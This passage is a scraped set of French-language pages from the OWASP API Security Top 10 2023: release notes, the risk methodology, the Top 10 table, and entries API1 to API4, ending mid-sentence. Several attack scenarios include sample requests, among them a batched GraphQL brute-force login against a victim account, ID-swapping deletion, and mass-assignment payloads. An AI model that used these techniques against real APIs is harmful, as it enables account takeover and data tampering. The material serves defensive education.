"2025-10-24T22:26:55.300880"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x04-release-notes.md", "content": "# Notes de publication\n\nCe document est la seconde édition du OWASP API Security Top 10, disponible exactement quatre ans\naprès sa première publication. Beaucoup de choses ont changé dans le domaine (de\nla sécurité) des API. Le trafic des API a augmenté à un rythme soutenu, certains\nprotocoles API ont gagné en popularité, de nouvelles solutions de sécurité ont vu le jour, et, bien sûr, les attaquants ont développé de nouvelles compétences et techniques pour compromettre les API. Il était grand temps de mettre à jour la liste des dix risques de sécurité API les plus critiques.\n\nAvec une industrie de la sécurité des API plus mature, pour la première fois, il y a eu [un appel public à la collecte de données][1]. Malheureusement, aucune donnée n'a été envoyée, mais sur la base de l'expérience de l'équipe du projet, de l'examen attentif de la part des spécialistes de la sécurité des API et des retours de la communauté sur la version candidate, nous avons construit cette nouvelle liste. Dans la [section Méthodologie et Données][2], vous trouverez plus de détails sur la façon dont cette version a été construite. Pour plus de détails sur les risques de sécurité, veuillez vous référer à la [section Risques de sécurité des API][3].\n\nLe OWASP API Security Top 10 2023 est un document de sensibilisation tourné vers l'avenir pour une industrie en constante évolution. Il ne remplace pas les autres TOP 10. Dans cette édition :\n\n* Nous avons combiné l' \"Excessive Data Exposure\" et le \"Mass Assignment\" en mettant l'accent sur la cause commune : \"Broken Object Property Level Authorization\".\n* Nous avons mis davantage l'accent sur la consommation de ressources, plutôt que sur le rythme auquel elles sont épuisées.\n* Nous avons créé une nouvelle catégorie \"Unrestricted Access to Sensitive Business Flows\" pour aborder de nouvelles menaces, comprenant la plupart de celles qui peuvent être atténuées par le biais du rate limiting.\n* Nous avons ajouté \"Unsafe Consumption of APIs\" pour aborder quelque chose que nous avons commencé à voir : les attaquants ont commencé à chercher à compromettre les services intégrés de la cible, au lieu de viser directement les API. C'est le bon moment pour commencer à sensibiliser à ce risque croissant.\n\nLes API jouent un rôle de plus en plus important dans l'architecture moderne des microservices, les applications monopages (SPA), les applications mobiles, l'IoT, etc. Le OWASP API Security Top 10 est un effort nécessaire pour sensibiliser aux problèmes de sécurité des API modernes.\n\nCette mise à jour n'a été possible que grâce à l'énorme effort de plusieurs bénévoles, listés dans la [section Remerciements][4].\n\nMerci!\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: ./0xd0-about-data.md\n[3]: ./0x10-api-security-risks.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:55.424956"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x10-api-security-risks.md", "content": "# Risques de sécurité des API\n\nLa [méthodologie d'évaluation des risques de l'OWASP][1] a été utilisée pour effectuer l'analyse des risques.\n\nLa table ci-dessous résume la terminologie associée au \"score\" de risque.\n\n| Facteur de menace | Exploitabilité | Prévalence de la faiblesse | Détectabilité de la faiblesse | Impact technique | Impacts organisationnel |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Spécifique à l'API | Facile: **3** | Répandue **3** | Facile **3** | Sévère **3** | Spécifique à l'organisation |\n| Spécifique à l'API | Moyenne: **2** | Commune   **2** | Moyenne **2** | Modéré **2** | Spécifique à l'organisation |\n| Spécifique à l'API | Difficile: **1** | Difficile **1** | Difficile **1** | Mineur **1** | Spécifique à l'organisation |\n\n\n**Note**: Cette approche ne prend pas en compte la probabilité de la menace. Elle ne tient pas non plus compte des divers détails techniques spécifiques à votre application. L'un de ces facteurs pourrait affecter significativement la probabilité globale qu'un attaquant trouve et exploite une vulnérabilité particulière. Cette notation ne prend pas en compte l'impact réel sur votre entreprise. Votre organisation devra décider du niveau de risque de sécurité des applications et des API que l'organisation est prête à accepter compte tenu de votre culture, de votre secteur et de votre environnement réglementaire. Le but du OWASP API Security Top 10 n'est pas de faire cette analyse de risque pour vous. Comme cette édition n'est pas basée sur des données, la prévalence résulte d'un consensus entre les membres de l'équipe.\n\n## Références\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### Externes\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://owasp.org/www-project-risk-assessment-framework/\n[2]: https://owasp.org/www-community/Threat_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:55.541850"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x11-t10.md", "content": "# OWASP Top 10 API Security Risks – 2023\n\n| Risque | Description |\n| ------ | ----------- |\n| [API1:2023 - Broken Object Level Authorization][api1] | Les API ont tendance à exposer des points d'accès (endpoints) qui manipulent des identifiants d'objets (OID), créant ainsi une large surface d'attaque sur les contrôles d'accès aux objets. Des contrôle d'autorisation doivent être effectuées dans chaque fonction qui accède à une source de données en utilisant un ID fourni par l'utilisateur. |\n| [API2:2023 - Broken Authentication][api2] | Les mécanismes d'authentification sont souvent implémentés de manière incorrecte, permettant aux attaquants de compromettre les jetons (token) d'authentification ou d'exploiter des failles d'implémentation afin d'usurper temporairement ou définitivement l'identité d'autres utilisateurs. L'incapacité d'un système à identifier le client/l'utilisateur compromet la sécurité de l'API dans son ensemble. |\n| [API3:2023 - Broken Object Property Level Authorization][api3] | Cette catégorie combine les anciennes catégories [API3:2019 Excessive Data Exposure][1] et [API6:2019 - Mass Assignment][2], en se concentrant sur la cause commune : le manque de validation ou une validation incorrecte dans le processus d'autorisation au niveau des propriétés de l'objet. Cela conduit à une exposition ou une manipulation d'informations par des parties non autorisées. |\n| [API4:2023 - Unrestricted Resource Consumption][api4] | Satisfaire les requêtes API nécessite des ressources telles que la bande passante réseau, le CPU, la mémoire et le stockage. D'autres ressources telles que les e-mails/SMS/appels téléphoniques ou la validation biométrique sont mises à disposition par les fournisseurs de services via des intégrations API, moyennant un paiement par requête effectuée. Des attaques réussies peuvent entraîner un déni de service ou une augmentation des coûts opérationnels. |\n| [API5:2023 - Broken Function Level Authorization][api5] | Les politiques de contrôle d'accès complexes avec différentes hiérarchies, groupes et rôles, et une séparation floue entre les fonctions normales et d'administration, tendent à entraîner des failles d'autorisation. En exploitant ces problèmes, les attaquants peuvent accéder aux ressources d'autres utilisateurs et/ou aux fonctions d'administration. |\n| [API6:2023 - Unrestricted Access to Sensitive Business Flows][api6] | Les API vulnérables à ce risque exposent un flux métier - tel que l'achat d'un billet ou la publication d'un commentaire - sans compenser l'impact potentiellement néfaste pour l'entreprise si la fonctionnalité est utilisée de manière excessive et automatisée. Cela ne provient pas nécessairement de bugs d'implémentation. |\n| [API7:2023 - Server Side Request Forgery][api7] | Les failles de type SSRF (Server-Side Request Forgery) peuvent survenir lorsqu'une API récupère une ressource distante sans valider l'URI fourni par l'utilisateur. Cela permet à un attaquant de forcer l'application à envoyer une requête forgée vers une destination inattendue, même si elle est protégée par un pare-feu ou un VPN. |\n| [API8:2023 - Security Misconfiguration][api8] | Les API et les systèmes qui les supportent contiennent généralement des configurations complexes, destinées à rendre les API plus personnalisables. Les ingénieurs logiciels et DevOps peuvent passer à côté de ces configurations, ou ne pas suivre les meilleures pratiques de sécurité en matière de configuration, ouvrant la porte à différents types d'attaques. |\n| [API9:2023 - Improper Inventory Management][api9] | Les API ont tendance à exposer plus de points d'accès que les applications web traditionnelles, ce qui rend une documentation propre et à jour très importante. Un inventaire correct des hôtes et des versions d'API déployées est également important pour atténuer les problèmes tels que les versions d'API obsolètes et les points d'accès de débuggage exposés. |\n| [API10:2023 - Unsafe Consumption of APIs][api10] | Les développeurs ont tendance à faire plus confiance aux données reçues des API tierces qu'aux entrées des utilisateurs, et adoptent donc souvent des normes de sécurité plus faibles. Afin de compromettre les API, les attaquants s'attaquent aux services tiers intégrés plutôt que de tenter de compromettre directement l'API cible. |\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/\n[api1]: 0xa1-broken-object-level-authorization.md\n[api2]: 0xa2-broken-authentication.md\n[api3]: 0xa3-broken-object-property-level-authorization.md\n[api4]: 0xa4-unrestricted-resource-consumption.md\n[api5]: 0xa5-broken-function-level-authorization.md\n[api6]: 0xa6-unrestricted-access-to-sensitive-business-flows.md\n[api7]: 0xa7-server-side-request-forgery.md\n[api8]: 0xa8-security-misconfiguration.md\n[api9]: 0xa9-improper-inventory-management.md\n[api10]: 0xaa-unsafe-consumption-of-apis.md\n", "timestamp": "2025-10-24T22:26:55.654170"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa1-broken-object-level-authorization.md", "content": "# API1:2023 Broken Object Level Authorization\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Répandue** : Détection **Facile** | Technique **Modérée** : Spécifique à l'organisation |\n| Les attaquants peuvent exploiter les points d'accès (endpoints) de l'API qui sont vulnérables au \"Broken Object Level Authorization\" en manipulant l'ID de l'objet envoyé dans la requête. Les ID d'objet peuvent être des entiers, des UUID (identifiants uniques universels) ou des chaînes de caractères. Quel que soit le type de données, ils sont faciles à identifier dans la requête (dans le chemin ou dans les paramètres), son en-tête (header) ou même dans sa payload. | Ce problème est extrêmement courant dans les applications basées sur des API car le composant serveur ne suit généralement pas pleinement l'état du client, et se repose plutôt sur des paramètres comme les ID d'objet, qui sont envoyés par le client pour décider à quels objets accéder. La réponse du serveur est généralement suffisante pour comprendre si la requête a réussi. | L'accès non autorisé aux objets d'autres utilisateurs peut entraîner la divulgation de données à des parties non autorisées, la perte de données ou la manipulation de données. Dans certaines circonstances, l'accès non autorisé aux objets peut également entraîner une prise de contrôle complète du compte. |\n\n## L'API est-elle vulnérable ?\n\nL'autorisation au niveau des objets est un mécanisme de contrôle d'accès qui est généralement implémenté au niveau du code pour valider qu'un utilisateur ne peut accéder qu'aux objets auxquels il devrait avoir accès.\n\nChaque point d'accès (endpoint) de l'API qui reçoit un ID d'un objet et effectue une action sur l'objet devrait implémenter des vérifications d'autorisation au niveau de l'objet. Les vérifications devraient valider que l'utilisateur connecté a les autorisations pour effectuer l'action demandée sur l'objet demandé.\n\nLes échecs de ce mécanisme conduisent généralement à la divulgation non autorisée d'informations, à la modification ou à la destruction de toutes les données.\n\nComparer l'ID de l'utilisateur de la session actuelle (par exemple, en l'extrayant du jeton JWT) avec le paramètre ID vulnérable n'est pas une solution suffisante pour résoudre le Broken Object Level Authorization (BOLA). Cette approche ne pourrait résoudre qu'un petit sous-ensemble de cas.\n\nDans ce cas du BOLA, c'est par conception que l'utilisateur aura accès au point d'accès (endpoint) ou à la fonction vulnérable. La violation se produit au niveau de l'objet, en manipulant l'ID. Si un attaquant parvient à accéder à un point d'accès (endpoint) ou à une fonction API à laquelle il ne devrait pas avoir accès, il s'agit d'un cas de [Broken Function Level Authorization][5] (BFLA) plutôt que d'un BOLA.\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUne plateforme de e-commerce pour des magasins en ligne fournit une page avec les graphiques des revenus que le magasin a généré. En inspectant les requêtes du navigateur, un attaquant peut identifier les points d'accès de l'API utilisés comme source de données pour ces graphiques et leur modèle : `/shops/{shopName}/revenue_data.json`. En utilisant un autre point d'accès de l'API, l'attaquant peut obtenir la liste de tous les noms de magasins hébergés. Avec un simple script pour manipuler les noms de la liste, en remplaçant `{shopName}` dans l'URL, l'attaquant obtient accès aux données de vente de milliers de magasins de e-commerce.\n\n### Scénario #2\n\nUn fabricant automobile a permis le contrôle à distance de ses véhicules via une API mobile pour communiquer avec le téléphone mobile du conducteur. L'API permet au conducteur de démarrer et d'arrêter le moteur et de verrouiller et déverrouiller les portes à distance. Dans ce flux, l'utilisateur envoie le numéro d'identification du véhicule (VIN) à l'API. L'API ne valide pas que le VIN représente un véhicule appartenant à l'utilisateur connecté, ce qui conduit à une vulnérabilité de BOLA. Un attaquant peut accéder à des véhicules qui ne lui appartiennent pas.\n\n### Scénario #3\n\nUn service de stockage de documents en ligne permet aux utilisateurs de visualiser, d'éditer, de stocker et de supprimer leurs documents. Lorsqu'un document d'un utilisateur est supprimé, une mutation GraphQL avec l'ID du document est envoyée à l'API.\n\n```\nPOST /graphql\n{\n  \"operationName\":\"deleteReports\",\n  \"variables\":{\n    \"reportKeys\":[\"<DOCUMENT_ID>\"]\n  },\n  \"query\":\"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {\n    {\n      deleteReports(reportKeys: $reportKeys)\n    }\n  }\"\n}\n```\n\nL'API ne vérifie pas si l'utilisateur connecté a les autorisations pour supprimer le document avec l'ID fourni. Un attaquant peut supprimer les documents d'autres utilisateurs en remplaçant l'ID du document dans la requête.\n\n## Comment s'en prémunir\n\n* Implémentez un mécanisme d'autorisation approprié qui repose sur les politiques et la hiérarchie des utilisateurs.\n* Utilisez le mécanisme d'autorisation pour vérifier si l'utilisateur connecté peut effectuer l'action demandée sur l'objet dans chaque fonction qui utilise une entrée du client pour accéder à la base de données.\n* Préférez l'utilisation de valeurs GUID aléatoires et imprévisibles pour les ID.\n* Écrivez des tests pour évaluer la vulnérabilité du mécanisme d'autorisation. Ne déployez pas de modifications qui feraient échouer les tests.\n\n## Références\n\n### OWASP\n\n* [Authorization Cheat Sheet][1]\n* [Authorization Testing Automation Cheat Sheet][2]\n\n### Externes\n\n* [CWE-285: Improper Authorization][3]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][4]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/285.html\n[4]: https://cwe.mitre.org/data/definitions/639.html\n[5]: ./0xa5-broken-function-level-authorization.md\n", "timestamp": "2025-10-24T22:26:55.763468"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa2-broken-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa2-broken-authentication.md", "content": "# API2:2023 Broken Authentication\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Répandue** : Détectabilité **Facile** | Technique **Grave** : Spécifique à l'organisation |\n| Le mécanisme d'authentification est une cible facile pour les attaquants car il est exposé à tout le monde. Bien que des compétences techniques plus avancées puissent être nécessaires pour exploiter certaines failles d'authentification, des outils d'exploitation sont généralement disponibles. | Les erreurs de conception commises par les ingénieurs logiciels et en sécurité ou la complexité d'implémentation rendent les problèmes courants pour l'authentification des utilisateurs. Les méthodologies de détection des problèmes d'authentification sont disponibles et faciles à créer. | Les attaquants peuvent prendre le contrôle complet des comptes d'autres utilisateurs du système, lire leurs données personnelles et effectuer des actions sensibles en leur nom. Les systèmes sont peu susceptibles de pouvoir distinguer les actions des attaquants de celles des utilisateurs légitimes. |\n\n\n## L'API est-elle vulnérable ?\n\nLes points d'accès (endpoints) et les flux d'authentification sont des actifs qui doivent être protégés. De plus, les mécanismes de \"Mot de passe oublié / réinitialisation du mot de passe\" doivent être traités de la même manière que les mécanismes d'authentification.\n\nUne API est vulnérable si elle :\n\n* Permet le bourrage d'informations d'identification, où l'attaquant utilise la force brute avec une liste de noms d'utilisateur et de mots de passe valides.\n* Permet aux attaquants d'effectuer une attaque par force brute sur le même compte utilisateur, sans présenter de mécanisme de captcha/blocage de compte.\n* Permet des mots de passe faibles.\n* Envoie des détails d'authentification sensibles, tels que des jetons d'authentification et des mots de passe dans l'URL.\n* Permet aux utilisateurs de modifier leur adresse e-mail, leur mot de passe actuel ou de réaliser d'autres opérations sensibles sans demander de confirmation de mot de passe.\n* Ne valide pas l'authenticité des jetons.\n* Accepte des jetons JWT non signés/faiblement signés (`{\"alg\":\"none\"}`)\n* Ne valide pas la date d'expiration du JWT.\n* Utilise des mots de passe en clair, non chiffrés ou faiblement hachés.\n* Utilise des clés de chiffrement faibles.\n\nDe plus, un microservice est vulnérable si :\n\n* D'autres microservices peuvent y accéder sans authentification.\n* Il utilise des jetons faibles ou prévisibles pour appliquer l'authentification.\n\n## Exemple de scénarios d'attaque\n\n## Scénario #1\n\nPour effectuer une authentification utilisateur, le client doit envoyer une requête API comme celle-ci avec les informations d'identification de l'utilisateur :\n\n```\nPOST /graphql\n{\n  \"query\":\"mutation {\n    login (username:\\\"<username>\\\",password:\\\"<password>\\\") {\n      token\n    }\n   }\"\n}\n```\n\nSi les informations d'identification sont valides, un jeton d'authentification est renvoyé. Ce jeton doit être fourni dans les requêtes suivantes pour identifier l'utilisateur. Les tentatives de connexion sont soumises à une limitation de \"rate limite\": seules trois requêtes sont autorisées par minute.\n\nPour effectuer une connexion par force brute avec le compte d'une victime, les attaquants utilisent le regroupement de requêtes GraphQL pour contourner la limitation du taux de requêtes, accélérant ainsi l'attaque :\n\n```\nPOST /graphql\n[\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"password\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123456\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"qwerty\\\"){token}}\"},\n  ...\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123\\\"){token}}\"},\n]\n```\n\n## Scénario #2\n\nPour mettre à jour l'adresse e-mail associée au compte d'un utilisateur, les clients doivent envoyer une requête API comme celle-ci :\n\n```\nPUT /account\nAuthorization: Bearer <token>\n\n{ \"email\": \"<new_email_address>\" }\n```\n\nComme l'API ne demande pas aux utilisateurs de confirmer leur identité en fournissant leur mot de passe actuel, les attanquants qui sont capables de voler le jeton d'authentification pourraient être en mesure de prendre le contrôle du compte de la victime en demandant la réinitialisation du mot de passe après avoir mis à jour l'adresse e-mail du compte de la victime.\n\n## Comment s'en prémunir\n\n* Assurez-vous de connaître tous les flux possibles pour s'authentifier à l'API (mobile/web/liens profonds qui implémentent l'authentification en un clic/etc.). Demandez à vos ingénieurs quels flux vous avez manqués.\n* Documentez-vous sur vos mécanismes d'authentification. Assurez-vous de comprendre ce qu'ils sont et comment ils sont utilisés. OAuth n'est pas une authentification, pas plus que les clés API.\n* Ne réinventez pas la roue en matière d'authentification, de génération de jetons ou de stockage de mots de passe. Utilisez les standards.\n* Les points d'accès de récupération des informations d'identification/mot de passe oublié doivent être traités comme des points d'accès de connexion. Ils doivent être protégés contre les attaques par la force brute : par le blocage de comptes ou la mise en place de \"rate limiting\" contraignant.\n* Exigez une ré-authentification pour les opérations sensibles (par exemple, changer l'adresse e-mail du propriétaire du compte/le numéro de téléphone 2FA).\n* Utilisez le [Cheat Sheet d'authentification OWASP][1].\n* Là où c'est possible, mettez en œuvre l'authentification multi-facteurs.\n* Mettez en œuvre des mécanismes anti-brute force pour atténuer le bourrage d'informations d'identification, les attaques par dictionnaire et les attaques par force brute sur vos points d'accès d'authentification. Ce mécanisme doit être plus strict que les mécanismes de \"rate limiting\" réguliers sur vos API.\n* Mettez en œuvre des mécanismes de [blocage de compte][2]/captcha pour prévenir les attaques par force brute contre des utilisateurs spécifiques. Mettez en œuvre des vérifications de mots de passe faibles.\n* Les clés API ne doivent pas être utilisées pour l'authentification des utilisateurs. Elles ne doivent être utilisées que pour l'[authentification des clients API][3].\n\n## Références\n\n### OWASP\n\n* [Authentication Cheat Sheet][1]\n* [Key Management Cheat Sheet][4]\n* [Credential Stuffing][5]\n\n### Externes\n\n* [CWE-204: Observable Response Discrepancy][6]\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][7]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism(OTG-AUTHN-003)\n[3]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\n[5]: https://owasp.org/www-community/attacks/Credential_stuffing\n[6]: https://cwe.mitre.org/data/definitions/204.html\n[7]: https://cwe.mitre.org/data/definitions/307.html\n", "timestamp": "2025-10-24T22:26:55.883178"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa3-broken-object-property-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa3-broken-object-property-level-authorization.md", "content": "# API3:2023 Broken Object Property Level Authorization\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Courante** : Détectabilité **Facile** | Technique **Modérée** : Spécifique à l'organisation |\n| Les API ont tendance à exposer des points d'accès qui retournent toutes les propriétés d'un objet. Cela est particulièrement vrai pour les API REST. Pour d'autres protocoles tels que GraphQL, il peut être nécessaire de formuler des requêtes spécifiques pour annoncer quelles propriétés doivent être retournées. Identifier ces propriétés supplémentaires qui peuvent être manipulées demande plus d'efforts, mais il existe quelques outils automatisés disponibles pour aider dans cette tâche. | L'inspection des réponses API suffit pour identifier les informations sensibles dans les représentations des objets retournés. Le fuzzing est généralement utilisé pour identifier des propriétés supplémentaires (cachées). L'écriture d'une requête API spécifique et l'analyse de sa réponse peut permettre de savoir si ces propriétés peuvent être modifiées. Une analyse des effets secondaires peut être nécessaire si la propriété cible n'est pas retournée dans la réponse API. | Un accès non autorisé aux propriétés d'objet privées/sensibles peut entraîner une divulgation de données, une perte de données ou une corruption de données. Dans certaines circonstances, un accès non autorisé aux propriétés d'objet peut entraîner une élévation de privilèges ou une prise de contrôle partielle/totale du compte. |\n\n## L'API est-elle vulnérable ?\n\nLorsqu'un utilisateur est autorisé à accéder à un objet en utilisant un point d'accès API, il est important de valider que l'utilisateur à le droit d'accéder aux propriétés spécifiques de l'objet.\n\nUn point d'accès API est vulnérable si :\n\n* Le point d'accès API expose des propriétés d'un objet qui sont considérées comme sensibles et qui ne devraient pas être lues par l'utilisateur. (précédemment nommé : \"[Excessive Data Exposure][1]\")\n* Le point d'accès API permet à un utilisateur de modifier, d'ajouter ou de supprimer la valeur d'une propriété sensible de l'objet à laquelle l'utilisateur ne devrait pas avoir accès (précédemment nommé : \"[Mass Assignment][2]\")\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUne application de rencontres permet à un utilisateur de signaler d'autres utilisateurs pour un comportement inapproprié.\nDans le cadre de ce processus, l'utilisateur clique sur un bouton \"signaler\", et l'appel API suivant est déclenché :\n\n```\nPOST /graphql\n{\n  \"operationName\":\"reportUser\",\n  \"variables\":{\n    \"userId\": 313,\n    \"reason\":[\"offensive behavior\"]\n  },\n  \"query\":\"mutation reportUser($userId: ID!, $reason: String!) {\n    reportUser(userId: $userId, reason: $reason) {\n      status\n      message\n      reportedUser {\n        id\n        fullName\n        recentLocation\n      }\n    }\n  }\"\n}\n```\n\nLe point d'accès API est vulnérable car il permet à l'utilisateur authentifié d'accéder à des propriétés sensibles de l'objet utilisateur, telles que \"fullName\" et \"recentLocation\", qui ne sont pas censées être accessibles par d'autres utilisateurs.\n\n### Scénario #2\n\nUne plateforme de location en ligne, qui propose à un type d'utilisateurs (\"hôtes\") de louer leur appartement à un autre type d'utilisateurs (\"invités\"), exige que l'hôte accepte une réservation faite par un invité, avant de facturer l'invité pour le séjour.\n\nDans le cadre de ce processus, un appel API est envoyé par l'hôte à `POST /api/host/approve_booking` avec la payload suivante :\n\n```\n{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\"\n}\n```\n\nL'hôte rejoue la requête légitime, et ajoute la payload malveillante suivante :\n\n```\n{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\",\n  \"total_stay_price\": \"$1,000,000\"\n}\n```\n\nLe point d'accès API est vulnérable car il n'y a pas de validation des droits d'accès de l'hôte à la propriété d'objet - `total_stay_price`, et l'invité sera facturé plus qu'il ne le devrait.\n\n### Scénario #3\n\nUn réseau social basé sur de courtes vidéos, applique un filtrage de contenu restrictif et une censure. Même si une vidéo téléchargée est bloquée, l'utilisateur peut modifier la description de la vidéo en utilisant la requête API suivante :\n\n```\nPUT /api/video/update_video\n\n{\n  \"description\": \"a funny video about cats\"\n}\n```\n\nUn utilisateur frustré peut rejouer la requête légitime, et ajouter la payload malveillante suivante :\n\n```\n{\n  \"description\": \"a funny video about cats\",\n  \"blocked\": false\n}\n```\n\nLe point d'accès API est vulnérable car il n'y a pas de validation si l'utilisateur devrait avoir accès à la propriété d'objet - `blocked`, et l'utilisateur peut changer la valeur de `true` à `false` et débloquer son propre contenu bloqué.\n\n## Comment s'en prémunir\n\n* Lors de l'exposition d'un objet à l'aide d'un point d'accès API, assurez-vous toujours que l'utilisateur a accès aux propriétés de l'objet que vous exposez.\n* Évitez d'utiliser des méthodes génériques telles que `to_json()` et `to_string()`. Au lieu de cela, choisissez spécifiquement les propriétés de l'objet que vous souhaitez retourner.\n* Si possible, évitez d'utiliser des fonctions qui lient automatiquement l'entrée du client à des variables dans du code, des objets internes ou des propriétés d'objet (\"Mass Assignment\").\n* Autorisez uniquement les modifications des propriétés de l'objet qui peuvent être mises à jour par le client.\n* Mettez en œuvre un mécanisme de validation des réponses basé sur un schéma en tant que couche de sécurité supplémentaire. Dans le cadre de ce mécanisme, définissez et appliquez les données retournées par toutes les méthodes API.\n* Gardez les structures de données retournées au strict minimum, conformément aux exigences commerciales/fonctionnelles pour le point d'accès.\n\n## Références\n\n### OWASP\n\n* [API3:2019 Excessive Data Exposure - OWASP API Security Top 10 2019][1]\n* [API6:2019 - Mass Assignment - OWASP API Security Top 10 2019][2]\n* [Mass Assignment Cheat Sheet][3]\n\n### Externes\n\n* [CWE-213: Exposure of Sensitive Information Due to Incompatible Policies][4]\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][5]\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\n[4]: https://cwe.mitre.org/data/definitions/213.html\n[5]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:55.993681"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa4-unrestricted-resource-consumption.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa4-unrestricted-resource-consumption.md", "content": "# API4:2023 Unrestricted Resource Consumption\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Moyenne** | Prévalence **Répandue** : Détection **Facile** | Technique **Grave** : Spécifique à l'organisation |\n| L'exploitation de cette faille nécessite des requêtes API simples. Plusieurs requêtes simultanées peuvent être effectuées à partir d'un seul ordinateur local ou en utilisant des ressources cloud. La plupart des outils automatisés disponibles sont conçus pour provoquer un déni de service (DoS) via des charges de trafic élevées, impactant le taux de service des API. | Il est courant de trouver des API qui ne limitent pas les interactions client ou la consommation de ressources. Écrire et tester avec des requêtes API incluant des paramètres qui contrôlent le nombre de ressources à renvoyer et qui effectuent une analyse de l'état/du temps/de la longueur de la réponse, devraient permettre d'identifier le problème. Il en va de même pour les opérations groupées. Bien que les attaquants n'aient pas de visibilité sur l'impact des coûts, cela peut être déduit en fonction du modèle commercial/tarifaire des fournisseurs de services (par exemple, le fournisseur de services cloud). | L'exploitation peut entraîner un déni de service (DoS) en raison de l'épuisement des ressources, mais elle peut également entraîner une augmentation des coûts opérationnels tels que ceux liés à l'infrastructure : en raison d'une demande accrue en CPU, l'augmentation des besoins en stockage sur le cloud, etc. |\n\n## L'API est-elle vulnérable ?\n\nSatisfaire les requêtes API nécessite des ressources telles que la bande passante réseau, le CPU, la mémoire et le stockage. Parfois, les ressources requises sont mises à disposition par les fournisseurs de services via des intégrations API, et payées par requête, comme l'envoi d'e-mails/SMS/appels téléphoniques, la validation biométrique, etc.\n\nUne API est vulnérable si au moins l'une des limites suivantes est manquante ou définie de manière inappropriée (par exemple, trop basse/élevée) :\n\n* Limites de temps d'exécution\n* Mémoire allouable maximale\n* Nombre maximal de descripteurs de fichiers (file descriptors)\n* Nombre maximal de processus\n* Taille maximale de fichier téléchargeable (upload)\n* Nombre d'opérations à effectuer dans une seule requête client API (par exemple, le regroupement GraphQL)\n* Nombre d'enregistrements par page à renvoyer dans une seule requête-réponse\n* Limite de dépenses des fournisseurs de services tiers\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUn réseau social a mis en place un flux de \"mot de passe oublié\" utilisant la vérification par SMS, permettant à l'utilisateur de recevoir un 